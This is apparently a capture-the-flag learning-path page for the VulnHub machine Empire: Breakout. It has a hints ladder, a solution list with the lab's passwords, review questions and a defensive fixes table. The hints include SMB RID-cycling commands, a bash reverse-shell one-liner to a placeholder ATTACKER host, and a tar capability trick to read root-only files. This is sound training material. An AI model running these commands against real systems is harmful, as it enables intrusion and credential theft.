# Machine 8 — Empire: Breakout

> **Position:** 8 of 13 · **Band 3 — Easy** (global rank **028** of 708)
> **Full writeup:** [`labs/3-028-empire-breakout/README.md`](../../labs/3-028-empire-breakout/README.md)

| | |
| --- | --- |
| **Machine** | Empire: Breakout |
| **Author** | icex64 & Empire Cybersecurity |
| **Released** | 21 October 2021 |
| **Target** | Debian 11 — Apache 2.4.51, Samba 4.6.2, **Webmin 1.981 (:10000)**, **Usermin 1.830 (:20000)** |
| **VulnHub** | [entry/empire-breakout,751](https://vulnhub.com/entry/empire-breakout,751/) |
| **Flags** | 2 — `/home/cyber/user.txt`, `/root/rOOt.txt` |
| **Estimated time** | 4–5 hours |

---

## Why this machine is here

Three lessons you will not get anywhere else in this path:

1. **`-p-` is non-negotiable.** The entire box lives on ports **10000** and
   **20000**. A default scan of the top 1,000 ports finds nothing useful, and most
   beginners give up here. This is the machine that teaches you to always scan every
   port.
2. **Obfuscation is not protection, taken to its logical extreme.** The password is
   hidden in a **brainfuck program** embedded in an HTML comment. It looks
   impenetrable and decodes in under a second.
3. **Linux file capabilities** — a genuinely different escalation primitive from
   SUID, and one that most people do not know to check. `cap_dac_read_search` on a
   `tar` binary lets an ordinary user read *any file on the system*.

It also introduces **SMB null-session enumeration and RID cycling** — getting
usernames with no credentials at all.

## Learning objectives

1. Scan **all 65,535 ports** and recognise an unusual service from its banner
   (`MiniServ` → Webmin/Usermin).
2. Distinguish **Webmin** from **Usermin** — different products, different audiences,
   different exposure.
3. Decode **brainfuck** locally.
4. Enumerate SMB users with **`enum4linux`** and understand **RID cycling**.
5. Get a command channel from a **web-based admin console**, and understand why that
   is *not* a real shell.
6. Use **`getcap -r /`** and interpret `cap_dac_read_search=ep`.
7. Use **`tar`** to bypass a discretionary-access-control read restriction, and
   explain why **extraction changes the file's owner**.
8. Recognise the "**plaintext password in a backup directory**" pattern.

## Attack classes covered

| Class | Where on this box |
| --- | --- |
| Non-standard ports | **10000** (Webmin), **20000** (Usermin) |
| **Obfuscation as fake protection** | Brainfuck program in the Apache default page's HTML comment |
| **SMB null session + RID cycling** | 139/445 → username **`cyber`**, NetBIOS name `BREAKOUT` |
| SMB signing not required | Samba 4.6.2 → relay exposure |
| **Exposed admin consoles** | Webmin and Usermin both reachable from the network |
| Admin console → command channel | **Usermin Command Shell** as `cyber` |
| Patch drift | Usermin 1.830 older than Webmin 1.981, same product family |
| **Plaintext secret in a backup** | `/var/backups/.old_pass.bak`, mode `600` root |
| **File capabilities** | `/home/cyber/tar` with `cap_dac_read_search=ep` |

## Read first

- [01 — Foundations](../01-Foundations-Networking-and-Recon.md) §6–§7 — full-port
  scanning and what `-sC` adds.
- [03 — Service and Network Attacks](../03-Service-and-Network-Attacks.md) **§2** —
  SMB, null sessions, and the RID-cycling subsection, written for this machine.
- [04 — Credentials and Cracking](../04-Credentials-and-Cracking.md) §1 — encoding
  versus encryption.
- [05 — Linux Privilege Escalation](../05-Linux-Privilege-Escalation.md) **§3**
  (capabilities) — this is the whole escalation.

## Before you start — answer these

1. Your scan of the top 1,000 ports shows only 80, 139 and 445. What is your next
   command, and why?
2. What is **RID cycling**, and what SMB setting must be true for it to work?
3. Is a shell obtained through a web admin console the same as an SSH shell? Name two
   concrete differences.
4. What does `cap_dac_read_search` allow that ordinary Unix permissions forbid?
5. When you `tar` a root-owned file and extract it as yourself, who owns the copy?
   Why?

## Hints ladder

<details>
<summary><strong>Rung 1 — a nudge</strong></summary>

Two things.

**First:** your scan is incomplete. Run `sudo nmap -p- -sV TARGET`. Two high ports
will appear that you have not seen before, and their banners will name a product
family.

**Second:** port 80 serves the stock Apache Debian default page. Look at its **HTML
source**. There is something in a comment that is not English, not base64, and not
hex. It is made almost entirely of the characters `> < + - . [ ]`.
</details>

<details>
<summary><strong>Rung 2 — the encoding and the username</strong></summary>

That character set is **brainfuck**, an esoteric programming language. It is a
*program*, so you run it rather than decode it:

```bash
# install a brainfuck interpreter, or decode in python
bf '<the program>'
# or
python3 -c "import sys;print(__import__('subprocess').run(['bf',sys.argv[1]],capture_output=True,text=True).stdout)" '<prog>'
```

→ **`.2uqPEfj3D<P'a-3`**

For the username, enumerate SMB with **no credentials**:

```bash
enum4linux -a TARGET
crackmapexec smb TARGET --rid-brute 2000
```

→ user **`cyber`**, NetBIOS name `BREAKOUT`. You now have one unknown, not two.
</details>

<details>
<summary><strong>Rung 3 — which console</strong></summary>

Port **10000** is **Webmin** (root-level administration). Port **20000** is
**Usermin** (self-service, per-user). Try `cyber : .2uqPEfj3D<P'a-3` on both.

**Webmin fails. Usermin succeeds.**

Inside Usermin, find the **Command Shell** module. It runs commands as `cyber` over
HTTPS. Read `/home/cyber/user.txt` → **user flag**.

That command channel is *not* a real shell — no TTY, no job control. Get one:

```bash
# ATTACKER:  nc -lvnp 4444
# Usermin Command Shell:
bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
```
</details>

<details>
<summary><strong>Rung 4 — the escalation</strong></summary>

`sudo -l` will not help; you have no sudo rights. Run the capability check instead:

```bash
getcap -r / 2>/dev/null
```
```text
/home/cyber/tar = cap_dac_read_search+ep
```

> `cap_dac_read_search` bypasses **file read** permission checks and **directory
> search** checks. It does not let you write or execute — but it lets `tar` read
> *anything*.

`/var/backups/.old_pass.bak` is mode `600` owned by root, so `cat` fails. `tar` does not:

```bash
/home/cyber/tar -cvf /tmp/leak.tar /var/backups/.old_pass.bak
cd /tmp && /home/cyber/tar -xvf leak.tar
cat tmp/var/backups/.old_pass.bak    # extraction ran as YOU, so the copy is yours
```

→ the **root password** in plaintext. `su root` → `/root/rOOt.txt`.
</details>

<details>
<summary><strong>Rung 5 — the answer</strong></summary>

1. `nmap -p-` → **80**, **139**, **445**, **10000**, **20000**. No SSH at all.
2. Port 80 is the stock Apache page, but its **HTML source hides a brainfuck
   program** → decode → **`.2uqPEfj3D<P'a-3`**.
3. `enum4linux -a` / RID cycling → username **`cyber`**, NetBIOS `BREAKOUT`;
   SMB signing **not required**.
4. **Webmin :10000** login fails; **Usermin :20000** login **succeeds** with
   `cyber : .2uqPEfj3D<P'a-3`.
5. Usermin's **Command Shell** → commands as `cyber` → **`/home/cyber/user.txt`**
   (user flag) → upgrade to a real reverse shell.
6. `getcap -r / 2>/dev/null` → **`/home/cyber/tar = cap_dac_read_search+ep`**.
7. Use it to read root-only **`/var/backups/.old_pass.bak`** → archive, extract (the
   copy is now owned by `cyber`) → root password **`Ts&4&YurgtRX(=~h`**.
8. `su root` → **`/root/rOOt.txt`**.
</details>

## After you finish — review questions

1. Which command found the ports that mattered, and why did your first scan miss them?
2. Brainfuck is a *Turing-complete language*, not an encoding. Does that make the
   secret harder to recover than base64? Explain precisely.
3. Webmin and Usermin are the same product family. Why did the *older* one let you in
   and the newer one not? What does "patch drift within a product family" mean for an
   audit checklist?
4. Why is Usermin's Command Shell a poor substitute for a shell? List three concrete
   limitations you hit.
5. `cap_dac_read_search` is *narrower* than root. Why was it still fatal here?
6. When you extracted the archive, why did the file's owner change to you? Explain
   what `tar` does on extraction regarding ownership and the `--same-owner` flag.
7. The box has no SSH. Did that make it more or less secure overall? Argue both sides.
8. What would `nmap --script smb-security-mode` have told you, and why does that
   output matter beyond this box?

## Defensive reflection

| Finding | Fix |
| --- | --- |
| Brainfuck secret in a public page | Anything in HTML is public. Obfuscation is not confidentiality — never rely on it |
| **SMB null session + RID cycling** | Require SMB signing (`server signing = mandatory`); restrict anonymous enumeration (`restrict anonymous = 2` on Windows, `restrict anonymous = yes` in Samba) |
| Webmin and Usermin exposed to the network | **Bind them to localhost or a management VLAN.** Administrative consoles must never face the user network |
| Usermin Command Shell enabled | Disable the module. A self-service console should not offer arbitrary command execution |
| Patch drift (Usermin 1.830 vs Webmin 1.981) | Inventory *every* installed component and version; patch as a family, not per-product |
| **Root password in `/var/backups/`** | Never store plaintext credentials in backups. If rotation history is needed, store it in a secrets manager with audit logging |
| `cap_dac_read_search` on a user-owned binary | Remove the capability (`setcap -r`). Audit `getcap -r /` regularly — most baselines check SUID and forget capabilities entirely |
| No SSH, but two web consoles | Reducing one remote-access path while opening two others is a net loss. Count your *actual* attack surface |

**The single biggest lesson:** *a narrow privilege can be fatal.* `cap_dac_read_search`
cannot execute anything and cannot write anything — it can only read. That was enough
to hand over root, because one readable file contained the password.

---

_Back to [Learning Path 1](../README.md) · previous: [Machine 7 — Mr-Robot: 1](07-mr-robot-1.md) · next: [Machine 9 — CengBox: 1](09-cengbox-1.md) · full writeup: [`labs/3-028-empire-breakout`](../../labs/3-028-empire-breakout/README.md)._
